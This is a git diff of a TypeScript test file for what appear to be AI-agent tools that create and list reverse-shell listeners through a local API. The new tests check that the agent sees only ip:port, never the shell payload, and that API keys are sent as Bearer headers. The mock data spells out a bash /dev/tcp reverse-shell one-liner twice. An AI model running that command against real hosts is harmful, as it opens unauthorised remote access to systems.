@@ -59,7 +59,38 @@ describe("shellpoop tools", () => {
       expect.objectContaining({ method: "POST" }),
     )
     expect(text).toContain("ab12cd34ef56")
-    expect(text).toContain("connect_command")
+    expect(text).toContain("192.168.1.10:20001")
+    // payload（具体反弹命令）不暴露给 Agent，只给 ip:port
+    expect(text).not.toContain("connect_command")
+    expect(text).not.toContain("dev/tcp")
+  })
+
+  it("create 与 list 的结果都不包含反弹 payload（connect_command/payloads）", async () => {
+    const shell = {
+      id: "ab12cd34ef56",
+      ip: "192.168.1.10",
+      port: 20001,
+      endpoint: "192.168.1.10:20001",
+      connected: false,
+      connect_command: "bash -i >& /dev/tcp/192.168.1.10/20001 0>&1",
+      payloads: { "bash-c": "bash -i >& /dev/tcp/192.168.1.10/20001 0>&1" },
+    }
+    vi.mocked(fetch)
+      .mockResolvedValueOnce(jsonResponse(201, shell))
+      .mockResolvedValueOnce(jsonResponse(200, { total: 1, connected: 0, shells: [shell] }))
+
+    const createResult = await tool("shellpoop_create").execute("call-1", {}, undefined)
+    const createText = (createResult.content[0] as { text: string }).text
+    expect(createText).toContain("192.168.1.10:20001")
+    expect(createText).not.toContain("connect_command")
+    expect(createText).not.toContain("payloads")
+    expect(createText).not.toContain("dev/tcp")
+
+    const listResult = await tool("shellpoop_list").execute("call-2", {}, undefined)
+    const listText = (listResult.content[0] as { text: string }).text
+    expect(listText).toContain("192.168.1.10:20001")
+    expect(listText).not.toContain("connect_command")
+    expect(listText).not.toContain("payloads")
   })
 
   it("lists shells via GET /shell", async () => {
@@ -141,6 +172,58 @@ describe("shellpoop tools", () => {
     vi.mocked(fetch).mockResolvedValue(jsonResponse(200, { total: 0 }))
     await listTool.execute("call-1", {}, undefined)
     expect(fetch).toHaveBeenCalledWith("http://127.0.0.1:8000/shell", expect.anything())
+  })
+
+  it("配置 apiKey 时携带 Authorization: Bearer 头", async () => {
+    vi.mocked(fetch).mockResolvedValue(jsonResponse(200, { total: 0 }))
+    const listTool = createShellPoopTools({
+      baseUrl: "http://127.0.0.1:8000",
+      apiKey: "secret-token",
+    }).find((t) => t.name === "shellpoop_list")!
+    await listTool.execute("call-1", {}, undefined)
+    expect(fetch).toHaveBeenCalledWith(
+      "http://127.0.0.1:8000/shell",
+      expect.objectContaining({
+        headers: expect.objectContaining({ Authorization: "Bearer secret-token" }),
+      }),
+    )
+  })
+
+  it("未配置 apiKey 时不发送 Authorization 头", async () => {
+    vi.mocked(fetch).mockResolvedValue(jsonResponse(201, { id: "abc", connected: false }))
+    await tool("shellpoop_create").execute("call-1", {}, undefined)
+    const [, init] = vi.mocked(fetch).mock.calls[0]!
+    const headers = (init as RequestInit).headers as Record<string, string> | undefined
+    expect(headers?.Authorization).toBeUndefined()
+  })
+
+  it("resolveApiKey 每次请求都重新解析（SecretStore 改动即时生效）", async () => {
+    let current = "key-1"
+    const listTool = createShellPoopTools({
+      baseUrl: "http://127.0.0.1:8000",
+      resolveApiKey: () => current,
+    }).find((t) => t.name === "shellpoop_list")!
+    // 每次调用都返回新的 Response（body 只能读一次）。
+    vi.mocked(fetch).mockImplementation(async () => jsonResponse(200, { total: 0 }))
+
+    await listTool.execute("call-1", {}, undefined)
+    expect(fetch).toHaveBeenNthCalledWith(
+      1,
+      "http://127.0.0.1:8000/shell",
+      expect.objectContaining({
+        headers: expect.objectContaining({ Authorization: "Bearer key-1" }),
+      }),
+    )
+
+    current = "key-2" // 模拟用户在 WebUI 里改密钥：不重建会话也生效
+    await listTool.execute("call-2", {}, undefined)
+    expect(fetch).toHaveBeenNthCalledWith(
+      2,
+      "http://127.0.0.1:8000/shell",
+      expect.objectContaining({
+        headers: expect.objectContaining({ Authorization: "Bearer key-2" }),
+      }),
+    )
   })
 })
 
